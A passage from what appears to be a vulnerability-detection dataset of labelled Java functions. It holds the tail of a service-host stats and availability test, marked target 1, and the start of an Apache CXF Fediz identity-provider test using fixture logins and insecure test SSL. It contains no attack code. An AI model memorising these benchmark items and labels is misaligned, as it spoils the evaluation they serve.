UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 4);\n\n        // filter on latestValue, GT\n        odataFilterValue = String.format(\"%s gt %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                0.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 3);\n\n        // filter on latestValue, eq\n        odataFilterValue = String.format(\"%s eq %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                -200.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 1);\n\n        // filter on latestValue, le\n        odataFilterValue = String.format(\"%s le %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1000.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 2);\n\n        // filter on latestValue, lt AND gt\n        odataFilterValue = String.format(\"%s lt %f and %s gt %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                2000.0,\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1000.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // two entries end with \"Day\"\n        assertTrue(filteredStats.entries.size() == 0);\n\n        // test dual filter with suffix match, and latest value LEQ\n        odataFilterValue = String.format(\"%s eq *%s and %s le %f\",\n                ServiceStat.FIELD_NAME_NAME,\n                ServiceStats.STAT_NAME_SUFFIX_PER_DAY,\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1001.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // single entry ends with \"Day\" and has latestValue <= 1000\n        assertTrue(filteredStats.entries.size() == 1);\n        assertTrue(filteredStats.entries\n                .containsKey(\"someKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY));\n\n    }\n\n    private void verifyStatCreationAttemptAfterGet() throws Throwable {\n        // Create a stat without a log histogram or time series, then try to recreate with\n        // the extra features and make sure its updated\n\n        List<Service> services = this.host.doThroughputServiceStart(\n                1, MinimalTestService.class,\n                this.host.buildMinimalTestState(), EnumSet.of(ServiceOption.INSTRUMENTATION), null);\n\n        final String statName = \"foo\";\n        for (Service service : services) {\n            service.setStat(statName, 1.0);\n            ServiceStat st = service.getStat(statName);\n            assertTrue(st.timeSeriesStats == null);\n            assertTrue(st.logHistogram == null);\n            ServiceStat stNew = new ServiceStat();\n            stNew.name = statName;\n            stNew.logHistogram = new ServiceStatLogHistogram();\n            stNew.timeSeriesStats = new TimeSeriesStats(60,\n                    TimeUnit.MINUTES.toMillis(1), EnumSet.of(AggregationType.AVG));\n            service.setStat(stNew, 11.0);\n            st = service.getStat(statName);\n            assertTrue(st.timeSeriesStats != null);\n            assertTrue(st.logHistogram != null);\n        }\n    }\n\n    private ServiceStats getStats(ExampleServiceState exampleServiceState) {\n        return this.host.getServiceState(null, ServiceStats.class, UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink));\n    }\n\n    private ServiceStats getStats(URI statsUri) {\n        return this.host.getServiceState(null, ServiceStats.class, statsUri);\n    }\n\n    @Test\n    public void testTimeSeriesStats() throws Throwable {\n        long startTime = TimeUnit.MILLISECONDS.toMicros(System.currentTimeMillis());\n        int numBins = 4;\n        long interval = 1000;\n        double value = 100;\n        // set data to fill up the specified number of bins\n        TimeSeriesStats timeSeriesStats = new TimeSeriesStats(numBins, interval,\n                EnumSet.allOf(AggregationType.class));\n        for (int i = 0; i < numBins; i++) {\n            startTime += TimeUnit.MILLISECONDS.toMicros(interval);\n            value += 1;\n            timeSeriesStats.add(startTime, value, 1);\n        }\n        assertTrue(timeSeriesStats.bins.size() == numBins);\n        // insert additional unique datapoints; the earliest entries should be dropped\n        for (int i = 0; i < numBins / 2; i++) {\n            startTime += TimeUnit.MILLISECONDS.toMicros(interval);\n            value += 1;\n            timeSeriesStats.add(startTime, value, 1);\n        }\n        assertTrue(timeSeriesStats.bins.size() == numBins);\n        long timeMicros = startTime - TimeUnit.MILLISECONDS.toMicros(interval * (numBins - 1));\n        long timeMillis = TimeUnit.MICROSECONDS.toMillis(timeMicros);\n        timeMillis -= (timeMillis % interval);\n        assertTrue(timeSeriesStats.bins.firstKey() == timeMillis);\n\n        // insert additional datapoints for an existing bin. The count should increase,\n        // min, max, average computed appropriately\n        double origValue = value;\n        double accumulatedValue = value;\n        double newValue = value;\n        double count = 1;\n        for (int i = 0; i < numBins / 2; i++) {\n            newValue++;\n            count++;\n            timeSeriesStats.add(startTime, newValue, 2);\n            accumulatedValue += newValue;\n        }\n        TimeBin lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg.equals(accumulatedValue / count));\n        assertTrue(lastBin.sum.equals((2 * count) - 1));\n        assertTrue(lastBin.count == count);\n        assertTrue(lastBin.max.equals(newValue));\n        assertTrue(lastBin.min.equals(origValue));\n        assertTrue(lastBin.latest.equals(newValue));\n\n        // test with a subset of the aggregation types specified\n        timeSeriesStats = new TimeSeriesStats(numBins, interval, EnumSet.of(AggregationType.AVG));\n        timeSeriesStats.add(startTime, value, value);\n        lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg != null);\n        assertTrue(lastBin.count != 0);\n        assertTrue(lastBin.sum == null);\n        assertTrue(lastBin.max == null);\n        assertTrue(lastBin.min == null);\n\n        timeSeriesStats = new TimeSeriesStats(numBins, interval, EnumSet.of(AggregationType.MIN,\n                AggregationType.MAX));\n        timeSeriesStats.add(startTime, value, value);\n        lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg == null);\n        assertTrue(lastBin.count == 0);\n        assertTrue(lastBin.sum == null);\n        assertTrue(lastBin.max != null);\n        assertTrue(lastBin.min != null);\n\n        timeSeriesStats = new TimeSeriesStats(numBins, interval, EnumSet.of(AggregationType.LATEST));\n        timeSeriesStats.add(startTime, value, value);\n        lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg == null);\n        assertTrue(lastBin.count == 0);\n        assertTrue(lastBin.sum == null);\n        assertTrue(lastBin.max == null);\n        assertTrue(lastBin.min == null);\n        assertTrue(lastBin.latest.equals(value));\n\n        // Step 2 - POST a stat to the service instance and verify we can fetch the stat just posted\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, 1,\n                ExampleServiceState.class, bodySetter, factoryURI);\n        ExampleServiceState exampleServiceState = states.values().iterator().next();\n        ServiceStats.ServiceStat stat = new ServiceStat();\n        stat.name = \"key1\";\n        stat.latestValue = 100;\n        // set bin size to 1ms\n        stat.timeSeriesStats = new TimeSeriesStats(numBins, 1, EnumSet.allOf(AggregationType.class));\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        for (int i = 0; i < numBins; i++) {\n            Thread.sleep(1);\n            this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                    this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        }\n        ServiceStats allStats = this.host.getServiceState(null, ServiceStats.class,\n                UriUtils.buildStatsUri(\n                        this.host, exampleServiceState.documentSelfLink));\n        ServiceStat retStatEntry = allStats.entries.get(stat.name);\n        assertTrue(retStatEntry.accumulatedValue == 100 * (numBins + 1));\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == numBins + 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.size() == numBins);\n\n        // Step 3 - POST a stat to the service instance with sourceTimeMicrosUtc and verify we can fetch the stat just posted\n        String statName = UUID.randomUUID().toString();\n        ExampleServiceState exampleState = new ExampleServiceState();\n        exampleState.name = statName;\n        Consumer<Operation> setter = (o) -> {\n            o.setBody(exampleState);\n        };\n        Map<URI, ExampleServiceState> stateMap = this.host.doFactoryChildServiceStart(null, 1,\n                ExampleServiceState.class, setter,\n                UriUtils.buildFactoryUri(this.host, ExampleService.class));\n        ExampleServiceState returnExampleState = stateMap.values().iterator().next();\n        ServiceStats.ServiceStat sourceStat1 = new ServiceStat();\n        sourceStat1.name = \"sourceKey1\";\n        sourceStat1.latestValue = 100;\n        // Timestamp 946713600000000 equals Jan 1, 2000\n        Long sourceTimeMicrosUtc1 = 946713600000000L;\n        sourceStat1.sourceTimeMicrosUtc = sourceTimeMicrosUtc1;\n        ServiceStats.ServiceStat sourceStat2 = new ServiceStat();\n        sourceStat2.name = \"sourceKey2\";\n        sourceStat2.latestValue = 100;\n        // Timestamp 946713600000000 equals Jan 2, 2000\n        Long sourceTimeMicrosUtc2 = 946800000000000L;\n        sourceStat2.sourceTimeMicrosUtc = sourceTimeMicrosUtc2;\n        // set bucket size to 1ms\n        sourceStat1.timeSeriesStats = new TimeSeriesStats(numBins, 1, EnumSet.allOf(AggregationType.class));\n        sourceStat2.timeSeriesStats = new TimeSeriesStats(numBins, 1, EnumSet.allOf(AggregationType.class));\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, returnExampleState.documentSelfLink)).setBody(sourceStat1));\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, returnExampleState.documentSelfLink)).setBody(sourceStat2));\n        allStats = getStats(returnExampleState);\n        retStatEntry = allStats.entries.get(sourceStat1.name);\n        assertTrue(retStatEntry.accumulatedValue == 100);\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.size() == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.firstKey()\n                .equals(TimeUnit.MICROSECONDS.toMillis(sourceTimeMicrosUtc1)));\n\n        retStatEntry = allStats.entries.get(sourceStat2.name);\n        assertTrue(retStatEntry.accumulatedValue == 100);\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.size() == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.firstKey()\n                .equals(TimeUnit.MICROSECONDS.toMillis(sourceTimeMicrosUtc2)));\n    }\n\n    public static class SetAvailableValidationService extends StatefulService {\n\n        public SetAvailableValidationService() {\n            super(ExampleServiceState.class);\n        }\n\n        @Override\n        public void handleStart(Operation op) {\n            setAvailable(false);\n            // we will transition to available only when we receive a special PATCH.\n            // This simulates a service that starts, but then self patch itself sometime\n            // later to indicate its done with some complex init. It does not do it in handle\n            // start, since it wants to make POST quick.\n            op.complete();\n        }\n\n        @Override\n        public void handlePatch(Operation op) {\n            // regardless of body, just become available\n            setAvailable(true);\n            op.complete();\n        }\n    }\n\n    @Test\n    public void failureOnReservedSuffixServiceStart() throws Throwable {\n        TestContext ctx = this.testCreate(ServiceHost.RESERVED_SERVICE_URI_PATHS.length);\n        for (String reservedSuffix : ServiceHost.RESERVED_SERVICE_URI_PATHS) {\n            Operation post = Operation.createPost(this.host,\n                    UUID.randomUUID().toString() + \"/\" + reservedSuffix)\n                    .setCompletion(ctx.getExpectedFailureCompletion());\n            this.host.startService(post, new MinimalTestService());\n        }\n        this.testWait(ctx);\n    }\n\n    @Test\n    public void testIsAvailableStatAndSuffix() throws Throwable {\n        long c = 1;\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, c,\n                ExampleServiceState.class, bodySetter, factoryURI);\n\n        // first verify that service that do not explicitly use the setAvailable method,\n        // appear available. Both a factory and a child service\n        this.host.waitForServiceAvailable(factoryURI);\n\n        // expect 200 from /factory/<child>/available\n        TestContext ctx = testCreate(states.size());\n        for (URI u : states.keySet()) {\n            Operation get = Operation.createGet(UriUtils.buildAvailableUri(u))\n                    .setCompletion(ctx.getCompletion());\n            this.host.send(get);\n        }\n        testWait(ctx);\n\n        // verify that PUT on /available can make it switch to unavailable (503)\n        ServiceStat body = new ServiceStat();\n        body.name = Service.STAT_NAME_AVAILABLE;\n        body.latestValue = 0.0;\n\n        Operation put = Operation.createPut(\n                UriUtils.buildAvailableUri(this.host, factoryURI.getPath()))\n                .setBody(body);\n        this.host.sendAndWaitExpectSuccess(put);\n\n        // verify factory now appears unavailable\n        Operation get = Operation.createGet(UriUtils.buildAvailableUri(factoryURI));\n        this.host.sendAndWaitExpectFailure(get);\n\n        // verify PUT on child services makes them unavailable\n        ctx = testCreate(states.size());\n        for (URI u : states.keySet()) {\n            put = put.clone().setUri(UriUtils.buildAvailableUri(u))\n                    .setBody(body)\n                    .setCompletion(ctx.getCompletion());\n            this.host.send(put);\n        }\n        testWait(ctx);\n\n        // expect 503 from /factory/<child>/available\n        ctx = testCreate(states.size());\n        for (URI u : states.keySet()) {\n            get = get.clone().setUri(UriUtils.buildAvailableUri(u))\n                    .setCompletion(ctx.getExpectedFailureCompletion());\n            this.host.send(get);\n        }\n        testWait(ctx);\n\n        // now validate a stateful service that is in memory, and explicitly calls setAvailable\n        // sometime after it starts\n        Service service = this.host.startServiceAndWait(new SetAvailableValidationService(),\n                UUID.randomUUID().toString(), new ExampleServiceState());\n\n        // verify service is NOT available, since we have not yet poked it, to become available\n        get = Operation.createGet(UriUtils.buildAvailableUri(service.getUri()));\n        this.host.sendAndWaitExpectFailure(get);\n\n        // send a PATCH to this special test service, to make it switch to available\n        Operation patch = Operation.createPatch(service.getUri())\n                .setBody(new ExampleServiceState());\n        this.host.sendAndWaitExpectSuccess(patch);\n\n        // verify service now appears available\n        get = Operation.createGet(UriUtils.buildAvailableUri(service.getUri()));\n        this.host.sendAndWaitExpectSuccess(get);\n    }\n\n    public void validateServiceUiHtmlResponse(Operation op) {\n        assertTrue(op.getStatusCode() == Operation.STATUS_CODE_MOVED_TEMP);\n        assertTrue(op.getResponseHeader(\"Location\").contains(\n                \"/core/ui/default/#\"));\n    }\n\n    public static void validateTimeSeriesStat(ServiceStat stat, long expectedBinDurationMillis) {\n        assertTrue(stat != null);\n        assertTrue(stat.timeSeriesStats != null);\n        assertTrue(stat.version >= 1);\n        assertEquals(expectedBinDurationMillis, stat.timeSeriesStats.binDurationMillis);\n        if (stat.timeSeriesStats.aggregationType.contains(AggregationType.AVG)) {\n            double maxCount = 0;\n            for (TimeBin bin : stat.timeSeriesStats.bins.values()) {\n                if (bin.count > maxCount) {\n                    maxCount = bin.count;\n                }\n            }\n            assertTrue(maxCount >= 1);\n        }\n    }\n\n    @Test\n    public void statsKeyOrder() {\n\n        ExampleServiceState state = new ExampleServiceState();\n        state.name = \"foo\";\n        Operation post = Operation.createPost(this.host, ExampleService.FACTORY_LINK).setBody(state);\n        state = this.sender.sendAndWait(post, ExampleServiceState.class);\n\n        ServiceStats stats = new ServiceStats();\n        ServiceStat stat = new ServiceStat();\n        stat.name = \"keyBBB\";\n        stat.latestValue = 10;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"keyCCC\";\n        stat.latestValue = 10;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"keyAAA\";\n        stat.latestValue = 10;\n        stats.entries.put(stat.name, stat);\n\n        URI exampleStatsUri = UriUtils.buildStatsUri(this.host, state.documentSelfLink);\n        this.sender.sendAndWait(Operation.createPut(exampleStatsUri).setBody(stats));\n\n        // odata stats prefix query\n        String odataFilterValue = String.format(\"%s eq %s*\", ServiceStat.FIELD_NAME_NAME, \"key\");\n        URI filteredStats = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        ServiceStats result = getStats(filteredStats);\n\n        // verify stats key order\n        assertEquals(3, result.entries.size());\n        List<String> statList = new ArrayList<>(result.entries.keySet());\n        assertEquals(\"stat index 0\", \"keyAAA\", statList.get(0));\n        assertEquals(\"stat index 1\", \"keyBBB\", statList.get(1));\n        assertEquals(\"stat index 2\", \"keyCCC\", statList.get(2));\n    }\n\n}\n", "target": 1}
{"idx": 1101, "func": "/**\n * Licensed to the Apache Software Foundation (ASF) under one\n * or more contributor license agreements. See the NOTICE file\n * distributed with this work for additional information\n * regarding copyright ownership. The ASF licenses this file\n * to you under the Apache License, Version 2.0 (the\n * \"License\"); you may not use this file except in compliance\n * with the License. You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing,\n * software distributed under the License is distributed on an\n * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n * KIND, either express or implied. See the License for the\n * specific language governing permissions and limitations\n * under the License.\n */\n\npackage org.apache.cxf.fediz.systests.idp;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URLEncoder;\nimport java.util.Base64;\n\nimport javax.servlet.ServletException;\n\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.w3c.dom.Node;\n\nimport com.gargoylesoftware.htmlunit.CookieManager;\nimport com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;\nimport com.gargoylesoftware.htmlunit.WebClient;\nimport com.gargoylesoftware.htmlunit.html.DomElement;\nimport com.gargoylesoftware.htmlunit.html.DomNodeList;\nimport com.gargoylesoftware.htmlunit.html.HtmlForm;\nimport com.gargoylesoftware.htmlunit.html.HtmlPage;\nimport com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;\nimport com.gargoylesoftware.htmlunit.xml.XmlPage;\n\nimport org.apache.catalina.LifecycleException;\nimport org.apache.catalina.LifecycleState;\nimport org.apache.catalina.connector.Connector;\nimport org.apache.catalina.startup.Tomcat;\nimport org.apache.commons.io.IOUtils;\nimport org.apache.cxf.fediz.core.FederationConstants;\nimport org.apache.cxf.fediz.core.util.DOMUtils;\nimport org.apache.http.auth.AuthScope;\nimport org.apache.http.auth.UsernamePasswordCredentials;\nimport org.apache.wss4j.dom.engine.WSSConfig;\nimport org.apache.xml.security.keys.KeyInfo;\nimport org.apache.xml.security.signature.XMLSignature;\nimport org.junit.AfterClass;\nimport org.junit.Assert;\nimport org.junit.BeforeClass;\nimport org.junit.Test;\n\n/**\n * Some tests invoking directly on the IdP\n */\npublic class IdpTest {\n\n    static String idpHttpsPort;\n    static String rpHttpsPort;\n\n    private static Tomcat idpServer;\n\n    @BeforeClass\n    public static void init() throws Exception {\n\n        idpHttpsPort = System.getProperty(\"idp.https.port\");\n        Assert.assertNotNull(\"Property 'idp.https.port' null\", idpHttpsPort);\n        rpHttpsPort = System.getProperty(\"rp.https.port\");\n        Assert.assertNotNull(\"Property 'rp.https.port' null\", rpHttpsPort);\n\n        idpServer = startServer(true, idpHttpsPort);\n\n        WSSConfig.init();\n    }\n\n    private static Tomcat startServer(boolean idp, String port)\n        throws ServletException, LifecycleException, IOException {\n        Tomcat server = new Tomcat();\n        server.setPort(0);\n        String currentDir = new File(\".\").getCanonicalPath();\n        String baseDir = currentDir + File.separator + \"target\";\n        server.setBaseDir(baseDir);\n\n        server.getHost().setAppBase(\"tomcat/idp/webapps\");\n        server.getHost().setAutoDeploy(true);\n        server.getHost().setDeployOnStartup(true);\n\n        Connector httpsConnector = new Connector();\n        httpsConnector.setPort(Integer.parseInt(port));\n        httpsConnector.setSecure(true);\n        httpsConnector.setScheme(\"https\");\n        httpsConnector.setAttribute(\"keyAlias\", \"mytomidpkey\");\n        httpsConnector.setAttribute(\"keystorePass\", \"tompass\");\n        httpsConnector.setAttribute(\"keystoreFile\", \"test-classes/server.jks\");\n        httpsConnector.setAttribute(\"truststorePass\", \"tompass\");\n        httpsConnector.setAttribute(\"truststoreFile\", \"test-classes/server.jks\");\n        httpsConnector.setAttribute(\"clientAuth\", \"want\");\n        // httpsConnector.setAttribute(\"clientAuth\", \"false\");\n        httpsConnector.setAttribute(\"sslProtocol\", \"TLS\");\n        httpsConnector.setAttribute(\"SSLEnabled\", true);\n\n        server.getService().addConnector(httpsConnector);\n\n        File stsWebapp = new File(baseDir + File.separator + server.getHost().getAppBase(), \"fediz-idp-sts\");\n        server.addWebapp(\"/fediz-idp-sts\", stsWebapp.getAbsolutePath());\n\n        File idpWebapp = new File(baseDir + File.separator + server.getHost().getAppBase(), \"fediz-idp\");\n        server.addWebapp(\"/fediz-idp\", idpWebapp.getAbsolutePath());\n\n        server.start();\n\n        return server;\n    }\n\n    @AfterClass\n    public static void cleanup() {\n        shutdownServer(idpServer);\n    }\n\n    private static void shutdownServer(Tomcat server) {\n        try {\n            if (server != null && server.getServer() != null\n                && server.getServer().getState() != LifecycleState.DESTROYED) {\n                if (server.getServer().getState() != LifecycleState.STOPPED) {\n                    server.stop();\n                }\n                server.destroy();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String getIdpHttpsPort() {\n        return idpHttpsPort;\n    }\n\n    public String getRpHttpsPort() {\n        return rpHttpsPort;\n    }\n\n    public String getServletContextName() {\n        return \"fedizhelloworld\";\n    }\n\n    @org.junit.Test\n    public void testSuccessfulInvokeOnIdP() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        final HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n\n        // Parse the form to get the token (wresult)\n        DomNodeList<DomElement> results = idpPage.getElementsByTagName(\"input\");\n\n        String wresult = null;\n        for (DomElement result : results) {\n            if (\"wresult\".equals(result.getAttributeNS(null, \"name\"))) {\n                wresult = result.getAttributeNS(null, \"value\");\n                break;\n            }\n        }\n\n        Assert.assertNotNull(wresult);\n\n        webClient.close();\n    }\n\n    @org.junit.Test\n    public void testSuccessfulSSOInvokeOnIdP() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.addRequestHeader(\"Authorization\", \"Basic \"\n            + Base64.getEncoder().encodeToString((user + \":\" + password).getBytes()));\n\n        //\n        // First invocation\n        //\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n\n        // Parse the form to get the token (wresult)\n        DomNodeList<DomElement> results = idpPage.getElementsByTagName(\"input\");\n\n        String wresult = null;\n        for (DomElement result : results) {\n            if (\"wresult\".equals(result.getAttributeNS(null, \"name\"))) {\n                wresult = result.getAttributeNS(null, \"value\");\n                break;\n            }\n        }\n\n        Assert.assertNotNull(wresult);\n\n        //\n        // Second invocation - change the credentials to make sure the session is set up correctly\n        //\n\n        webClient.removeRequestHeader(\"Authorization\");\n        webClient.addRequestHeader(\"Authorization\", \"Basic \"\n            + Base64.getEncoder().encodeToString((\"mallory\" + \":\" + password).getBytes()));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n\n        // Parse the form to get the token (wresult)\n        results = idpPage.getElementsByTagName(\"input\");\n\n        wresult = null;\n        for (DomElement result : results) {\n            if (\"wresult\".equals(result.getAttributeNS(null, \"name\"))) {\n                wresult = result.getAttributeNS(null, \"value\");\n                break;\n            }\n        }\n\n        Assert.assertNotNull(wresult);\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPMetadata() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort()\n            + \"/fediz-idp/FederationMetadata/2007-06/FederationMetadata.xml\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getOptions().setSSLClientCertificate(\n            this.getClass().getClassLoader().getResource(\"client.jks\"), \"storepass\", \"jks\");\n\n        final XmlPage rpPage = webClient.getPage(url);\n        final String xmlContent = rpPage.asXml();\n        Assert.assertTrue(xmlContent.startsWith(\"<md:EntityDescriptor\"));\n\n        // Now validate the Signature\n        Document doc = rpPage.getXmlDocument();\n\n        doc.getDocumentElement().setIdAttributeNS(null, \"ID\", true);\n\n        Node signatureNode =\n            DOMUtils.getChild(doc.getDocumentElement(), \"Signature\");\n        Assert.assertNotNull(signatureNode);\n\n        XMLSignature signature = new XMLSignature((Element)signatureNode, \"\");\n        KeyInfo ki = signature.getKeyInfo();\n        Assert.assertNotNull(ki);\n        Assert.assertNotNull(ki.getX509Certificate());\n\n        Assert.assertTrue(signature.checkSignatureValue(ki.getX509Certificate()));\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPMetadataDefault() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort()\n            + \"/fediz-idp/metadata\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getOptions().setSSLClientCertificate(\n            this.getClass().getClassLoader().getResource(\"client.jks\"), \"storepass\", \"jks\");\n\n        final XmlPage rpPage = webClient.getPage(url);\n        final String xmlContent = rpPage.asXml();\n        Assert.assertTrue(xmlContent.startsWith(\"<md:EntityDescriptor\"));\n\n        // Now validate the Signature\n        Document doc = rpPage.getXmlDocument();\n\n        doc.getDocumentElement().setIdAttributeNS(null, \"ID\", true);\n\n        Node signatureNode =\n            DOMUtils.getChild(doc.getDocumentElement(), \"Signature\");\n        Assert.assertNotNull(signatureNode);\n\n        XMLSignature signature = new XMLSignature((Element)signatureNode, \"\");\n        KeyInfo ki = signature.getKeyInfo();\n        Assert.assertNotNull(ki);\n        Assert.assertNotNull(ki.getX509Certificate());\n\n        Assert.assertTrue(signature.checkSignatureValue(ki.getX509Certificate()));\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPServiceMetadata() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort()\n            + \"/fediz-idp/metadata/urn:org:apache:cxf:fediz:idp:realm-B\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getOptions().setSSLClientCertificate(\n            this.getClass().getClassLoader().getResource(\"client.jks\"), \"storepass\", \"jks\");\n\n        final XmlPage rpPage = webClient.getPage(url);\n        final String xmlContent = rpPage.asXml();\n        Assert.assertTrue(xmlContent.startsWith(\"<md:EntityDescriptor\"));\n\n        // Now validate the Signature\n        Document doc = rpPage.getXmlDocument();\n\n        doc.getDocumentElement().setIdAttributeNS(null, \"ID\", true);\n\n        Node signatureNode =\n            DOMUtils.getChild(doc.getDocumentElement(), \"Signature\");\n        Assert.assertNotNull(signatureNode);\n\n        XMLSignature signature = new XMLSignature((Element)signatureNode, \"\");\n        KeyInfo ki = signature.getKeyInfo();\n        Assert.assertNotNull(ki);\n        Assert.assertNotNull(ki.getX509Certificate());\n\n        Assert.assertTrue(signature.checkSignatureValue(ki.getX509Certificate()));\n\n        webClient.close();\n    }\n\n    // Send an unknown wreq value\n    @org.junit.Test\n    public void testBadWReq() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += 